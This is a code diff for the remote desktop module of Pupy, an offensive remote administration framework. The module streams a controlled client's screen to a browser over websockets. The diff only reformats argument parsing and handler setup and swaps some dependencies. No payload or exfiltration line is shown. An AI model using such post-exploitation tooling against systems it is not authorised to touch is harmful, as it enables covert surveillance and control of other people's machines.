@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
@@ -8,7 +8,6 @@ import subprocess
 import time
 import threading
 import json
-import pyautogui
 
 __class_name__="RemoteDesktopModule"
 
@@ -99,7 +98,6 @@ class RdesktopWebSocketHandler(WebSocketHandler):
         if self.stop_events_thread:
             self.stop_events_thread.set()
 
-
 class IndexHandler(RequestHandler):
     def initialize(self, client):
         self.client = client
@@ -112,25 +110,40 @@ class IndexHandler(RequestHandler):
 class RemoteDesktopModule(PupyModule):
     """ Start a remote desktop session using a browser websocket client """
 
-    dependencies = ['mss', 'rdesktop', 'keyboard', 'PIL']
+    dependencies = ['mss', 'rdesktop', 'keyboard', 'png']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="rdesktop", description=self.__doc__)
-        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open a browser tab on the handler url')
-        self.arg_parser.add_argument('-r', '--refresh-interval', default=0.02, type=float, help='refresh interval. Set to 0 for best reactivity')
-        self.arg_parser.add_argument('-q', '--quality', default=75, type=int, help='image quality best_quality=95 worst_quality=20')
-        #self.arg_parser.add_argument('text', help='text to print in the msgbox :)')
+        self.arg_parser.add_argument(
+            '-v', '--view', action='store_true',
+            help='directly open a browser tab on the handler url')
 
+        self.arg_parser.add_argument(
+            '-r', '--refresh-interval',
+            default=0.02, type=float,
+            help='refresh interval. Set to 0 for best reactivity')
+
+        self.arg_parser.add_argument(
+            '-q', '--quality', default=75, type=int,
+            help='image quality best_quality=95 worst_quality=20')
 
     def run(self, args):
         self.web_handlers=[
-            (r'/?', IndexHandler, {'client': self.client}),
-            (r'/ws', RdesktopWebSocketHandler, {'client': self.client, 'refresh_interval': args.refresh_interval, 'quality':args.quality, 'module': self}),
+            (r'/?', IndexHandler, {
+                'client': self.client
+            }),
+            (r'/ws', RdesktopWebSocketHandler, {
+                'client': self.client,
+                'refresh_interval': args.refresh_interval,
+                'quality':args.quality,
+                'module': self
+            }),
         ]
-        url=self.start_webplugin()
+
+        url = self.start_webplugin()
+
         self.success("Web handler started on %s"%url)
         if args.view:
             config = self.client.pupsrv.config or PupyConfig()
             viewer = config.get('default_viewers', 'browser')
             subprocess.Popen([viewer, url])
-
